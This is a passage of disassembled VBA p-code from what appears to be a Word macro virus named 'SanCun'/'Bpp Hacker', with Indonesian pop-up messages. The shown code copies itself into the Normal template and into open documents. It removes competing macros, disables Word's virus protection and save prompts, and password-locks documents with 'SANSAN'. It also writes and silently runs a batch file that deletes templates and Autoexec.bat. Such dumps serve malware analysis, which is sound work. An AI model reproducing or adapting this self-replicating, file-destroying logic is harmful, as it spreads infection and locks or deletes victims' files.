' Line #128:
' 	QuoteRem 0x0004 0x0006 "SanCun"
' Line #129:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Message 0x0000 
' 	EndIf 
' 	QuoteRem 0x003C 0x0015 "p5687("C:\start.scr")"
' Line #130:
' 	QuoteRem 0x0004 0x0047 "If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")"
' Line #131:
' 	QuoteRem 0x0000 0x000C "Call Message"
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub FileTemplates())
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' 	ArgsCall SanCun 0x0000 
' Line #136:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Cad 0x0000 
' 	EndIf 
' 	QuoteRem 0x0038 0x0015 "p5687("C:\start.scr")"
' Line #137:
' 	QuoteRem 0x0004 0x0047 "If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")"
' Line #138:
' 	QuoteRem 0x0000 0x000C "Call Message"
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub ViewVBCode())
' Line #141:
' 	Dim 
' 	VarDefn Password
' 	VarDefn Pword
' Line #142:
' 	OnError (Resume Next) 
' Line #143:
' 	ArgsCall SanCun 0x0000 
' Line #144:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Cad 0x0000 
' 	EndIf 
' 	QuoteRem 0x0038 0x0015 "p5687("C:\start.scr")"
' Line #145:
' 	QuoteRem 0x0004 0x0047 "If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")"
' Line #146:
' 	Do 
' Line #147:
' 	QuoteRem 0x0004 0x0015 "Password = "ACENGLAH""
' Line #148:
' 	QuoteRem 0x0004 0x0029 "Pword = InputBox("Type in your password")"
' Line #149:
' 	QuoteRem 0x0004 0x0019 "If Pword <> Password Then"
' Line #150:
' 	QuoteRem 0x0008 0x0022 "MsgBox "Sorry, incorrect password""
' Line #151:
' 	QuoteRem 0x0008 0x0003 "End"
' Line #152:
' 	QuoteRem 0x0004 0x0006 "End If"
' Line #153:
' 	ArgsCall (Call) Cad 0x0000 
' Line #154:
' 	Loop 
' Line #155:
' 	EndSub 
' Line #156:
' 	FuncDefn (Sub Reg(strFile As String))
' Line #157:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #158:
' 	Ld hFile 
' 	Close 0x0001 
' Line #159:
' 	OnError (Resume Next) 
' Line #160:
' 	Ld Friend 
' 	St hFile 
' Line #161:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #162:
' 	LitStr 0x0005 "c:\c "
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #163:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #164:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "del c:\progra~1\micros~1\office\startup\*.dot"
' 	PrintItemNL 
' Line #165:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "del c:\progra~1\micros~1\templa~1\*.dot"
' 	PrintItemNL 
' Line #166:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "del c:\windows\*.dot"
' 	PrintItemNL 
' Line #167:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del Zap.bat"
' 	PrintItemNL 
' Line #168:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del Reg.bat"
' 	PrintItemNL 
' Line #169:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "del c:\Start.exe"
' 	PrintItemNL 
' Line #170:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "del C:\start.scr"
' 	PrintItemNL 
' Line #171:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "del C:\startv.bat"
' 	PrintItemNL 
' Line #172:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del C:\Autoexec.bat"
' 	PrintItemNL 
' Line #173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "del C:\Cacah.hit"
' 	PrintItemNL 
' Line #174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "del C:\cad.sys"
' 	PrintItemNL 
' Line #175:
' 	Ld hFile 
' 	Close 0x0001 
' Line #176:
' 	LitStr 0x0012 "c:\windows\Reg.bat"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #177:
' 	EndSub 
' Line #178:
' 	FuncDefn (Sub FileOpen())
' Line #179:
' 	OnError (Resume Next) 
' Line #180:
' 	ArgsCall WBT 0x0000 
' Line #181:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #182:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #183:
' 	ArgsCall Dockenor 0x0000 
' Line #184:
' 	ArgsCall Norkedoc 0x0000 
' Line #185:
' 	ArgsCall (Call) SanCun 0x0000 
' Line #186:
' 	ArgsCall WBF 0x0000 
' Line #187:
' 	ElseBlock 
' Line #188:
' 	ArgsCall WBF 0x0000 
' Line #189:
' 	ArgsCall (Call) SANSAN 0x0000 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	EndSub 
' Line #192:
' 	FuncDefn (Sub Message())
' Line #193:
' 	LitStr 0x0009 " San San "
' 	St nama1 
' Line #194:
' 	LitStr 0x0007 "San San"
' 	St Nama2 
' Line #195:
' 	LitStr 0x0013 "Lagi Ngapainn ???  "
' 	St msg1 
' Line #196:
' 	LitStr 0x0015 "Jangan Ngelamun Yeh.."
' 	St msg2 
' Line #197:
' 	LitStr 0x001D "Kerjain Tuh Tugasnya Yah.... "
' 	St msg3 
' Line #198:
' 	LitStr 0x001F "Buat Yang Laen Aku Minta Maaf  "
' 	St msg4 
' Line #199:
' 	LitStr 0x000A "I Love You"
' 	St msg1 
' Line #200:
' 	LitStr 0x0002 "  "
' 	St msg2 
' Line #201:
' 	LitStr 0x0027 "       This Come From My Heart and Soul"
' 	St msg3 
' Line #202:
' 	Ld msg1 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #203:
' 	LitDI2 0x0002 
' 	ArgsLd WeekDay 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld nama1 
' 	Add 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #204:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld Nama2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg4 
' 	Add 
' 	Ld Nama2 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x0003 "???"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #205:
' 	EndSub 
' Line #206:
' 	FuncDefn (Sub Enjoy())
' Line #207:
' 	LitStr 0x0008 " San !!!"
' 	St nama1 
' Line #208:
' 	LitStr 0x0007 "San San"
' 	St Nama2 
' Line #209:
' 	LitStr 0x0012 "Lagi Ngapainn ??? "
' 	St msg1 
' Line #210:
' 	LitStr 0x0019 "   Jangan Ngelamun Yeh.. "
' 	St msg2 
' Line #211:
' 	LitStr 0x0023 "         Kerjain Tuh Tugasnya .... "
' 	St msg3 
' Line #212:
' 	LitStr 0x001F "Buat Yang Laen Aku Minta Maaf  "
' 	St msg4 
' Line #213:
' 	LitStr 0x000B "Kamu  Juga "
' 	St msg5 
' Line #214:
' 	LitStr 0x001E "   Kok  Ikut-Ikutan Bengong ? "
' 	St msg6 
' Line #215:
' 	LitStr 0x0019 "Dasar  Dompok  Luh...Ah.."
' 	St msg7 
' Line #216:
' 	Ld msg1 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #217:
' 	Rem 0x0082 " If WeekDay(2) Then MsgBox msg5 + nama1 + Chr(10) + msg6 + Chr(10) + msg3 + Chr(10) + msg7 + nama1 + Chr(10) + msg4, vbInformation"
' Line #218:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld msg1 
' 	Ld Nama2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg2 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg3 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld msg4 
' 	Add 
' 	Ld Nama2 
' 	Add 
' 	Ld vbInformation 
' 	LitStr 0x0003 "???"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #219:
' 	EndSub 
' Line #220:
' 	FuncDefn (Function Dockenor())
' Line #221:
' 	OnError Erw1 
' Line #222:
' 	LitVarSpecial (False)
' 	St NorOk 
' Line #223:
' 	ArgsCall WBT 0x0000 
' Line #224:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #225:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #226:
' 	OnError Erh1a 
' Line #227:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #228:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #229:
' 	Ld NMacr 
' 	LitStr 0x0006 "SanCun"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NorOk 
' 	EndIf 
' Line #230:
' 	Ld NMacr 
' 	LitStr 0x0006 "SanCun"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #231:
' 	LitStr 0x002B "Normal Template Anda Terkena Virus Macro = "
' 	Ld NMacr 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0031 "Makro akan dihapus dan anda harap enunggu Sejenak"
' 	Add 
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x0006 "SANSAN"
' 	ArgsCall MsgBox 0x0003 
' Line #232:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #235:
' 	Label Erh1a 
' Line #236:
' 	Ld NorOk 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #237:
' 	OnError Erh1 
' Line #238:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "SanCun"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #239:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #240:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemLd Application 
' 	MemSt Visible 
' Line #241:
' 	Label Erh1 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	Label Erw1 
' Line #244:
' 	EndFunc 
' Line #245:
' 	FuncDefn (Function Norkedoc())
' Line #246:
' 	OnError Erw2 
' Line #247:
' 	LitDI2 0x0000 
' 	St DokSave 
' Line #248:
' 	LitVarSpecial (False)
' 	St Dokok 
' Line #249:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #250:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #251:
' 	OnError Erh2a 
' Line #252:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #253:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #254:
' 	Ld NMacr 
' 	LitStr 0x0006 "SanCun"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dokok 
' 	EndIf 
' Line #255:
' 	QuoteRem 0x0006 0x0029 "NMacr = NT.VBProject.VBComponents(i).Name"
' Line #256:
' 	QuoteRem 0x0006 0x0025 "If NMacr = "SanCun" Then Dokok = True"
' Line #257:
' 	LineCont 0x0004 07 00 08 00
' 	Ld NMacr 
' 	LitStr 0x0006 "SanCun"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #258:
' 	LitStr 0x0023 "Documen Anda Terkena Virus Macro = "
' 	Ld NMacr 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0036 "Virus Makro akan dihapus dan anda harap tunggu Sejenak"
' 	Add 
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x0006 "SANSAN"
' 	ArgsCall MsgBox 0x0003 
' Line #259:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #260:
' 	EndIfBlock 
' Line #261:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #262:
' 	Label Erh2a 
' Line #263:
' 	Ld Dokok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #264:
' 	OnError Erh2 
' Line #265:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "SanCun"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #266:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #267:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #268:
' 	Label Erh2 
' Line #269:
' 	EndIfBlock 
' Line #270:
' 	Label Erw2 
' Line #271:
' 	EndFunc 
' Line #272:
' 	FuncDefn (Function WBT())
' Line #273:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #274:
' 	EndFunc 
' Line #275:
' 	FuncDefn (Function WBF())
' Line #276:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #277:
' 	EndFunc 
' Line #278:
' 	FuncDefn (Function sim())
' Line #279:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St f56879025 
' Line #280:
' 	LitStr 0x0012 "c:\windows\Cad.sys"
' 	LitStr 0x0006 "SanCun"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #281:
' 	Ld f56879025 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo bodo 
' 	EndIf 
' Line #282:
' 	Ld f56879025 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo bodo 
' 	EndIf 
' Line #283:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #284:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "SanCun"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St xxx902578112 
' 	EndIf 
' Line #285:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #286:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #287:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "SanCun"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St mmf78116 
' 	EndIf 
' Line #288:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #289:
' 	Ld xxx902578112 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld mmf78116 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set o7811902511 
' 	EndIf 
' Line #290:
' 	Ld xxx902578112 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld mmf78116 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set o7811902511 
' 	EndIf 
' Line #291:
' 	LitStr 0x0012 "c:\windows\Cad.sys"
' 	Ld o7811902511 
' 	ArgsMemCall Import 0x0001 
' Line #292:
' 	Ld activeinst 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed fileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #293:
' 	Ld mmf78116 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #294:
' 	Label bodo 
' Line #295:
' 	EndFunc 
' Line #296:
' 	FuncDefn (Sub Pasword())
' Line #297:
' Line #298:
' 	QuoteRem 0x0000 0x001B "If ActiveDocument = AD Then"
' Line #299:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #300:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #301:
' 	LitVarSpecial (False)
' 	MemStWith EmbedTrueTypeFonts 
' Line #302:
' 	LitVarSpecial (False)
' 	MemStWith SaveFormsData 
' Line #303:
' 	LitVarSpecial (False)
' 	MemStWith SaveSubsetFonts 
' Line #304:
' 	LitStr 0x0006 "SANSAN"
' 	MemStWith Password 
' Line #305:
' 	LitStr 0x0006 "SANSAN"
' 	MemStWith WritePassword 
' Line #306:
' 	EndWith 
' Line #307:
' 	LitStr 0x0006 "SANSAN"
' 	Ld Application 
' 	MemSt DefaultSaveFormat 
' Line #308:
' 	LineCont 0x0010 0D 00 08 00 19 00 08 00 25 00 09 00 2F 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed fileName 
' 	Ld wdAutoFormat 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0006 "SANSAN"
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0006 "SANSAN"
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #309:
' Line #310:
' 	QuoteRem 0x0002 0x0004 "Else"
' Line #311:
' Line #312:
' 	QuoteRem 0x0005 0x0013 "With ActiveDocument"
' Line #313:
' 	QuoteRem 0x000C 0x001C ".ReadOnlyRecommended = False"
' Line #314:
' 	QuoteRem 0x000C 0x001B ".EmbedTrueTypeFonts = False"
' Line #315:
' 	QuoteRem 0x000C 0x0016 ".SaveFormsData = False"
' Line #316:
' 	QuoteRem 0x000C 0x0018 ".SaveSubsetFonts = False"
' Line #317:
' 	QuoteRem 0x000C 0x0014 ".Password = "SANSAN""
' Line #318:
' 	QuoteRem 0x000C 0x0019 ".WritePassword = "SANSAN""
' Line #319:
' 	QuoteRem 0x0005 0x0008 "End With"
' Line #320:
' 	QuoteRem 0x0008 0x0028 "Application.DefaultSaveFormat = "SANSAN""
' Line #321:
' 	LineCont 0x0010 01 00 AA FF 01 00 61 FF 01 00 09 FF 01 00 B7 FE
' 	QuoteRem 0x0008 0x0157 "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate,        'LockComments:=False, Password:="SANSAN", AddToRecentFiles:=True,        'WritePassword:="SANSAN", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False,        ' SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:=        'False"
' Line #322:
' 	QuoteRem 0x0003 0x0006 "End If"
' Line #323:
' 	EndSub 
' Line #324:
' 	FuncDefn (Sub ShowMessage())
' Line #325:
' 	Ld Time 
' 	St H 
' Line #326:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSunday 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Time 
' 	LitStr 0x0008 "21:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #327:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #328:
' 	ArgsCall Beep 0x0000 
' Line #329:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #330:
' 	LineCont 0x0010 0B 00 04 00 20 00 04 00 27 00 04 00 35 00 04 00
' 	LitStr 0x002A "Terimakasih buat dosenku yang amat sangat "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "bijaksana"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "yang telah memberiku nilai JELEK. Saya merasa bangga "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0030 "dan sungguh-sungguh bangga terhadap dosenku itu."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "Sekali lagi saya ucapkan terimakasih!."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001D "Semoga mereka tetap di STIKI."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0025 "(buat teman-teman, ma'af mengganggu.)"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x0012 "Ucapan Terimakasih"
' 	ArgsLd MsgBox 0x0003 
' 	St H 
' Line #331:
' 	EndIfBlock 
' Line #332:
' 	EndSub 
' Line #333:
' Line #334:
' 	FuncDefn (Sub Bablas())
' Line #335:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #336:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #337:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #338:
' 	EndSub 
' Line #339:
' 	FuncDefn (Sub HelpAbout())
' Line #340:
' 	LineCont 0x0004 10 00 04 00
' 	LitStr 0x001E "Qun katawon walataqun kalaler."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0018 "I LOVE SOMETHING ERROR !"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x000A "Bpp Hacker"
' 	ArgsLd MsgBox 0x0003 
' 	St H 
' Line #341:
' 	EndSub 
' Line #342:
' Line #343:
' 	FuncDefn (Sub ToolsOptions())
' Line #344:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #345:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #346:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #347:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #348:
' 	ArgsCall Bablas 0x0000 
' Line #349:
' 	EndSub 
' Line #350:
' Line #351:
' 	FuncDefn (Sub ChangeCap())
' Line #352:
' 	OnError (Resume Next) 
' Line #353:
' 	LitStr 0x001D "Bpp Hacker is now activating "
' 	Ld Application 
' 	MemSt Caption 
' Line #354:
' 	LitStr 0x001A "(I Don't mean to disturb.)"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #355:
' 	EndSub 
' Line #356:
' Line #357:
' 	FuncDefn (Sub RestoreCap())
' Line #358:
' 	OnError (Resume Next) 
' Line #359:
' 	LitStr 0x000E "Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #360:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #361:
' 	EndSub 
' Line #362:
' Line #363:
' 	FuncDefn (Sub OpenMyMacro())
' Line #364:
' 	LitStr 0x000E "Enter password"
' 	LitStr 0x000A "Bpp Hacker"
' 	ArgsLd InputBox 0x0002 
' 	LitStr 0x0007 "azizoke"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #365:
' 	EndSub 
' Line #366:
' Line #367:
' 	FuncDefn (Sub SikatDocument())
' Line #368:
' 	Dim 
' 	VarDefn DocOk (As Boolean)
' Line #369:
' 	LitVarSpecial (False)
